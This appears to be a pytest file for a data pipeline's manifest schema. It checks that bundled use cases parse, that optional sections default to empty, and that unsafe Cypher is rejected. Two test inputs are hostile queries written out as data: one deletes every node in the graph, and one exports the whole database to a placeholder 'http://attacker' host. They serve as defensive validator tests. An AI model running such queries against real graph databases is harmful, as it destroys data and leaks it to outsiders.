"""Manifest schema: cypher fields are validated, optional sections default to empty,
shipped bundles still parse cleanly."""
import pytest

from pathlib import Path

from pipeline.use_case import Manifest, UseCase


REPO = Path(__file__).resolve().parent.parent


def test_shipped_kf_mfg_manifest_validates():
    uc = UseCase.from_dir(REPO / "use_cases" / "kf-mfg-workorder")
    assert uc.manifest.prefix == "kf-mfg"
    assert len(uc.manifest.in_scope_classes) == 6
    assert len(uc.manifest.agents) == 3


def test_shipped_supply_chain_manifest_validates():
    uc = UseCase.from_dir(REPO / "use_cases" / "supply-chain")
    assert uc.manifest.prefix == "sc"
    assert len(uc.manifest.in_scope_classes) == 7


def test_er_rule_with_unsafe_cypher_rejected():
    with pytest.raises(Exception) as ei:
        Manifest(
            slug="x",
            name="X",
            prefix="x",
            namespace="http://example.org/x#",
            stage5_er_rules=[{
                "id": "evil",
                "description": "drops everything",
                "confidence": 1.0,
                "cypher": "MATCH (n) DETACH DELETE n RETURN 1 AS canonical_id, 2 AS duplicate_id",
            }],
        )
    assert "DELETE" in str(ei.value) or "DETACH" in str(ei.value)


def test_check_with_unsafe_cypher_rejected():
    with pytest.raises(Exception) as ei:
        Manifest(
            slug="x",
            name="X",
            prefix="x",
            namespace="http://example.org/x#",
            stage6_checks=[{
                "id": "evil-check",
                "kind": "cypher",
                "cypher": "CALL apoc.export.json.all('http://attacker', {}) YIELD file RETURN true AS passed",
            }],
        )
    assert "CALL" in str(ei.value)


def test_optional_sections_default_to_empty():
    m = Manifest(slug="x", name="X", prefix="x", namespace="http://example.org/x#")
    assert m.in_scope_classes == []
    assert m.stage5_er_rules == []
    assert m.stage6_checks == []
    assert m.agents == []
    assert m.examples == []


def test_unknown_top_level_field_rejected():
    with pytest.raises(Exception) as ei:
        Manifest(slug="x", name="X", prefix="x", namespace="http://example.org/x#", oops="field")
    assert "oops" in str(ei.value).lower() or "extra" in str(ei.value).lower()
